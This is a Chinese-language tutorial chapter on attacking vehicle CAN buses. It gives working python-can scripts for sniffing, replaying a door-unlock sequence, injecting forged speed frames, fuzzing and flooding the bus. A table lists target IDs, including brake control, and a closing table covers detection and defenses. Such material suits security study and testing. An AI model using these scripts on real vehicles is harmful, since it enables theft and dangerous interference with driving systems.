# CAN总线攻击

### 3.1 CAN攻击环境准备

**硬件：**
- USB-CAN适配器（推荐PCAN-USB或CANable）
- OBD-II转接线
- 汽车ECU或开发板（目标设备）

**软件：**
- can-utils（Linux）
- CANoe / CANalyzer（Windows，商业软件）
- Wireshark + CAN插件
- Python + python-can库
- 自定义脚本

### 3.2 CAN嗅探与分析

#### 3.2.1 基础嗅探

```python
# 使用python-can进行CAN总线监听
import can

# 创建CAN总线实例
bus = can.interface.Bus(channel='can0', interface='socketcan')

# 持续接收并打印报文
print("开始监听CAN总线...")
try:
    for msg in bus:
        # 格式化输出：时间戳 ID 数据
        data_str = ' '.join(f'{b:02X}' for b in msg.data)
        print(f"{msg.timestamp:10.6f}  ID={msg.arbitration_id:03X}  "
              f"{'RX' if msg.is_rx else 'TX'}  DLC={msg.dlc}  "
              f"Data: {data_str}")
except KeyboardInterrupt:
    print("\n停止监听")
finally:
    bus.shutdown()
```

#### 3.2.2 报文统计与分析

```python
# CAN报文统计分析
import can
from collections import defaultdict
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

id_stats = defaultdict(lambda: {'count': 0, 'last_time': 0, 'periods': []})
start_time = time.time()

print("进行10秒报文统计...")
try:
    for msg in bus:
        elapsed = time.time() - start_time
        if elapsed > 10:
            break

        stats = id_stats[msg.arbitration_id]
        stats['count'] += 1

        if stats['last_time'] > 0:
            period = (msg.timestamp - stats['last_time']) * 1000  # ms
            stats['periods'].append(period)

        stats['last_time'] = msg.timestamp

except KeyboardInterrupt:
    pass

# 输出统计结果
print(f"\n{'ID':>4}  {'出现次数':>6}  {'平均周期(ms)':>10}  {'速率(帧/秒)':>8}")
print("-" * 50)
for can_id in sorted(id_stats.keys()):
    stats = id_stats[can_id]
    rate = stats['count'] / 10
    avg_period = sum(stats['periods']) / len(stats['periods']) if stats['periods'] else 0
    print(f"{can_id:03X}  {stats['count']:>6}  {avg_period:>10.2f}  {rate:>8.1f}")
```

### 3.3 CAN重放攻击

#### 3.3.1 攻击原理

先录制正常的CAN报文序列，在适当的时候重新发送，达到控制车辆的目的。

#### 3.3.2 攻击步骤

```
① 录制阶段
   ├── 连接CAN适配器到目标总线
   ├── 触发目标动作（如按解锁键）
   ├── 录制相关的CAN报文序列
   └── 分析识别关键控制报文

② 重放阶段
   ├── 选择合适时机（如车辆锁定状态）
   ├── 发送录制的控制报文
   └── 观察是否达到预期效果
```

#### 3.3.3 示例代码

```python
# CAN重放攻击演示
import can
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

# 录制的"解锁车门"报文序列（示例）
unlock_frames = [
    # (延时秒数, CAN ID, 数据字节)
    (0.0, 0x300, [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    (0.01, 0x301, [0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    (0.05, 0x300, [0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
]

print("执行重放攻击：解锁车门")
for delay, can_id, data in unlock_frames:
    time.sleep(delay)
    msg = can.Message(
        arbitration_id=can_id,
        data=data,
        is_extended_id=False
    )
    bus.send(msg)
    print(f"  发送: ID={can_id:03X} Data={' '.join(f'{b:02X}' for b in data)}")

print("重放完成")
bus.shutdown()
```

### 3.4 CAN注入攻击

#### 3.4.1 攻击原理

攻击者构造并发送伪造的CAN报文，欺骗ECU执行相应动作。

#### 3.4.2 与重放攻击的区别

- **重放攻击**：发送之前录制的真实报文，数据完全合法
- **注入攻击**：构造并发送伪造的报文，数据由攻击者生成

#### 3.4.3 常见注入目标

| 目标功能 | 典型CAN ID | 攻击效果 |
|---------|-----------|---------|
| 车速 | 0x200~0x2FF | 虚假车速，影响仪表显示 |
| 发动机转速 | 0x100~0x1FF | 虚假转速 |
| 车门控制 | 0x300~0x3FF | 解锁/上锁车门 |
| 刹车控制 | 0x200~0x2FF | 控制刹车系统 |
| 灯光控制 | 0x400~0x4FF | 控制车灯 |
| 仪表盘 | 0x500~0x5FF | 控制仪表显示 |

#### 3.4.4 注入攻击示例

```python
# CAN注入攻击：伪造车速报文
import can
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("执行注入攻击：伪造车速为120km/h")
print("按Ctrl+C停止")

# 假设车速报文ID为0x200
# 车速 = (Byte0 << 8 | Byte1) / 10  km/h
# 120km/h = 1200 = 0x04B0
speed = 120  # km/h
speed_raw = int(speed * 10)  # 原始值
speed_high = (speed_raw >> 8) & 0xFF
speed_low = speed_raw & 0xFF

try:
    while True:
        msg = can.Message(
            arbitration_id=0x200,
            data=[speed_high, speed_low, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
            is_extended_id=False
        )
        bus.send(msg)
        time.sleep(0.01)  # 10ms周期，模拟真实发送频率
except KeyboardInterrupt:
    print("\n停止注入")
finally:
    bus.shutdown()
```

### 3.5 CAN模糊测试

#### 3.5.1 模糊测试目的

- 发现ECU软件漏洞（缓冲区溢出、空指针等）
- 测试ECU的健壮性
- 发现未定义行为

#### 3.5.2 模糊测试方法

**随机Fuzz：**
```python
import can
import random
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("随机模糊测试中...")
try:
    for _ in range(1000):
        # 随机ID和数据
        can_id = random.randint(0x000, 0x7FF)
        dlc = random.randint(0, 8)
        data = [random.randint(0, 255) for _ in range(dlc)]

        msg = can.Message(
            arbitration_id=can_id,
            data=data,
            is_extended_id=False
        )
        bus.send(msg)
        time.sleep(0.001)
except KeyboardInterrupt:
    pass
finally:
    bus.shutdown()
```

**变异Fuzz（基于正常报文）：**
```python
# 在已知正常报文基础上进行变异
import can
import random
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

# 正常报文模板
base_msgs = [
    (0x100, [0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0]),
    (0x200, [0x00, 0xFA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    (0x300, [0x01, 0x02, 0x03, 0x04, 0x00, 0x00, 0x00, 0x00]),
]

def mutate_data(data, mutation_rate=0.1):
    """对数据进行变异"""
    mutated = list(data)
    for i in range(len(mutated)):
        if random.random() < mutation_rate:
            mutated[i] = random.randint(0, 255)
    return mutated

print("变异模糊测试中...")
try:
    while True:
        can_id, data = random.choice(base_msgs)
        mutated_data = mutate_data(data, mutation_rate=0.2)

        msg = can.Message(
            arbitration_id=can_id,
            data=mutated_data,
            is_extended_id=False
        )
        bus.send(msg)
        time.sleep(0.005)
except KeyboardInterrupt:
    pass
finally:
    bus.shutdown()
```

### 3.6 CAN拒绝服务攻击

#### 3.6.1 总线洪泛攻击

```python
# CAN总线洪泛DoS攻击
import can
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("执行CAN总线洪泛攻击（持续5秒）...")
print("使用高优先级ID 0x000独占总线")

start_time = time.time()
count = 0
while time.time() - start_time < 5:
    msg = can.Message(
        arbitration_id=0x000,  # 最高优先级ID
        data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        is_extended_id=False
    )
    try:
        bus.send(msg)
        count += 1
    except can.CanError:
        pass

print(f"攻击完成，共发送 {count} 帧")
bus.shutdown()
```

### 3.7 CAN攻击防御检测

| 攻击类型 | 检测方法 | 防御措施 |
|---------|---------|---------|
| 嗅探攻击 | 极难检测（被动） | 加密通信 |
| 重放攻击 | 新鲜值检测、计数器 | 报文认证码(MAC)、新鲜值 |
| 注入攻击 | 时钟指纹、发送者认证 | 安全网关、报文认证 |
| 洪泛DoS | 频率检测、总线负载监测 | 网关限流、总线监控 |
| 模糊测试 | 异常数据检测 | 输入校验、健壮性设计 |

---

---

